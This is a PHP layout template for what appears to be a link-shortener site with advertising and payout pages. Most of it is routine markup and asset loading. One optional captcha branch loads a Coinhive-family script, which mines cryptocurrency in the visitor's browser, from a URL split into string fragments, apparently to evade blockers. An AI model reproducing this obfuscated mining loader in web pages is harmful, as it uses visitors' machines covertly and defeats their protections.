<?php
/**
 * @var \App\View\AppView $this
 */
?>
<?php $user = $this->request->session()->read('Auth.User'); ?>
<!DOCTYPE html>
<html lang="<?= locale_get_primary_language(null) ?>">
<head>
    <?= $this->Html->charset(); ?>
    <title><?= h($this->fetch('title')); ?></title>
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="<?= h($this->fetch('description')); ?>">
    <meta name="og:title" content="<?= h($this->fetch('og_title')); ?>">
    <meta name="og:description" content="<?= h($this->fetch('og_description')); ?>">
    <meta property="og:image" content="<?= h($this->fetch('og_image')); ?>"/>

    <link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic"
          rel="stylesheet">

    <?php
    echo $this->Html->meta('icon');

    echo $this->Assets->css('/vendor/bootstrap/css/bootstrap.min.css?ver=' . APP_VERSION);
    echo $this->Assets->css('/vendor/font-awesome/css/font-awesome.min.css?ver=' . APP_VERSION);
    echo $this->Assets->css('/vendor/dashboard/css/AdminLTE.min.css?ver=' . APP_VERSION);
    echo $this->Assets->css('/vendor/dashboard/css/skins/_all-skins.min.css?ver=' . APP_VERSION);
    echo $this->Assets->css('app.css?ver=' . APP_VERSION);

    echo $this->fetch('meta');
    echo $this->fetch('css');
    echo $this->fetch('script');

    ?>

    <?= get_option('head_code'); ?>

    <?= $this->fetch('scriptTop') ?>

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="//oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>
<body class="layout-top-nav skin-blue">
<?= get_option('after_body_tag_code'); ?>

<div class="wrapper">

    <header class="main-header">
        <!-- Fixed navbar -->
        <nav class="navbar">
            <div class="container">
                <div class="navbar-header">
                    <?php
                    $logo = get_logo();
                    $class = '';
                    if ($logo['type'] == 'image') {
                        $class = 'logo-image';
                    }
                    ?>
                    <a class="navbar-brand <?= $class ?>"
                       href="<?= build_main_domain_url('/'); ?>"><?= $logo['content'] ?></a>
                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse"
                            data-target="#navbar-collapse">
                        <i class="fa fa-bars"></i>
                    </button>
                </div>

                <!-- Collect the nav links, forms, and other content for toggling -->
                <div class="collapse navbar-collapse" id="navbar-collapse">
                    <ul class="nav navbar-nav navbar-right">
                        <?php if (get_option('enable_advertising', 'yes') == 'yes') : ?>
                            <li>
                                <a href="<?= build_main_domain_url('/advertising-rates'); ?>"><?= __('Advertising') ?></a>
                            </li>
                        <?php endif; ?>
                        <li>
                            <a href="<?= build_main_domain_url('/payout-rates'); ?>"><?= __('Payout Rates') ?></a>
                        </li>
                    </ul>
                </div>
                <!-- /.navbar-collapse -->
            </div>
        </nav>
    </header>

    <div class="content-wrapper">
        <div class="container banner-container">

            <!-- Main content -->
            <section class="content">

                <?= $this->fetch('content') ?>

            </section>
            <!-- /.content -->
        </div>
        <!-- /.container -->
    </div>
    <!-- /.content-wrapper -->

    <footer class="main-footer">
        <div class="container">
            <div class="pull-right hidden-xs">
                <ul class="list-inline">
                    <li><a href="<?= build_main_domain_url('/pages/privacy'); ?>"><?= __('Privacy Policy') ?></a></li>
                    <li><a href="<?= build_main_domain_url('/pages/terms'); ?>"><?= __('Terms of Use') ?></a></li>
                </ul>
            </div>
            <?= __('Copyright &copy;') ?> <?= h(get_option('site_name')) ?> <?= date("Y") ?>
        </div>
        <!-- /.container -->
    </footer>

</div>

<?= $this->element('js_vars'); ?>

<?= $this->Assets->script('/js/ads.js'); ?>

<?= $this->Assets->script('/vendor/jquery.min.js?ver=' . APP_VERSION); ?>
<?= $this->Assets->script('/vendor/bootstrap/js/bootstrap.min.js?ver=' . APP_VERSION); ?>
<?= $this->Assets->script('/vendor/clipboard.min.js?ver=' . APP_VERSION); ?>
<?= $this->Assets->script('/js/app.js?ver=' . APP_VERSION); ?>
<?= $this->Assets->script('/vendor/dashboard/js/app.min.js?ver=' . APP_VERSION); ?>

<?php if (in_array(get_option('captcha_type', 'recaptcha'), ['recaptcha', 'invisible-recaptcha'])) : ?>
    <script src="https://www.google.com/recaptcha/api.js?onload=onloadRecaptchaCallback&render=explicit"
            async defer></script>
<?php endif; ?>

<?php if (get_option('captcha_type') == 'solvemedia') : ?>
    <script language="javascript" type="text/javascript">
      var script = document.createElement('script');
      script.type = 'text/javascript';

      if (location.protocol === 'https:') {
        script.src = 'https://api-secure.solvemedia.com/papi/challenge.ajax';
      } else {
        script.src = 'http://api.solvemedia.com/papi/challenge.ajax';
      }
      document.body.appendChild(script);
    </script>
<?php endif; ?>

<?php if (get_option('captcha_type') == 'coinhive') : ?>
    <script language="javascript" type="text/javascript">
      var script = document.createElement('script');
      script.type = 'text/javascript';
      script.src = 'htt' + 'ps://' + 'aut' + 'hedm' + 'ine' + '.com/lib/ca' + 'ptcha' + '.min.js';
      document.body.appendChild(script);
    </script>
<?php endif; ?>

<?= $this->fetch('scriptBottom') ?>
<?= get_option('footer_code'); ?>
</body>
</html>
